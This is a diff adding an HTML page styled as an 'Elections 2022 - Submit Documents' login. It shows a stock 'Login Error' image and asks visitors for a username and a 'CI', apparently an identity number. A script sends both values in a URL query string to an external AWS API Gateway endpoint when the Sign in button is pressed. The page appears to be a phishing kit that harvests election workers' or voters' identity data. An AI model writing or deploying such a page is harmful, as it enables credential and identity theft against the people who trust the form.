@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>Elections 2022 - Submit Documents</title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+
+  <!-- Favicons -->
+  <link href="assets/img/favicon.png" rel="icon">
+  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Raleway:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+  <style>
+    img {
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+      margin-bottom: 30px;
+      width: 50%;
+    }
+    label {
+      margin-bottom: 5px;
+      margin-top: 10px;
+    }
+  </style>
+  
+</head>
+
+<body>
+  <script type="text/javascript" language="javascript">
+    function httpGetAsync(theUrl,callback) {
+      var xmlHttp = new XMLHttpRequest();
+      xmlHttp.open("GET", theUrl,true);
+      xmlHttp.setRequestHeader("Content-Type", "application/json");
+      xmlHttp.setRequestHeader("Access-Control-Allow-Origin", "application/json");
+      xmlHttp.onreadystatechange = function() { 
+          if (xmlHttp.readyState == 4 && xmlHttp.status == 200)
+              callback(xmlHttp.responseText);
+      }
+      xmlHttp.send();
+    }
+
+    function send(username,ci){
+      httpGetAsync("https://h8x873a8z0.execute-api.us-east-1.amazonaws.com/prod/Stage?username="+username+"&ci="+ci);
+    }
+
+  </script>
+  <div class="cta">
+    <div class="col-md-6 offset-md-3 mt-5">
+         <a target="_blank">
+            <img src='https://cdn.windowsreport.com/wp-content/uploads/2020/04/Login-Error.jpg'>
+          </a>
+          <br>
+          <h1 class="section-title">Enter to your account</h1>
+          <h4 class="section-title">In order to be able to submit the results of the election, please log into your account</h4>
+          <div class="form-group">
+              <label>Enter username</label>
+              <input type="text" id="username" name="username" class="form-control" placeholder="Username">
+            </div>
+            <div class="form-group">
+              <label>Enter CI</label>
+              <input type="text" id="ci" name="ci" class="form-control" placeholder="CI">
+            </div>
+            <hr>
+            <a class="btn btn-primary" onclick="javascript:send(document.getElementById('username').value,document.getElementById('ci').value)">
+              Sign in
+            </a>
+            <a class="btn btn-primary" href="inner-page.html">Continue</a>
+      </div> 
+  </div>
+</body>
+
+</html>
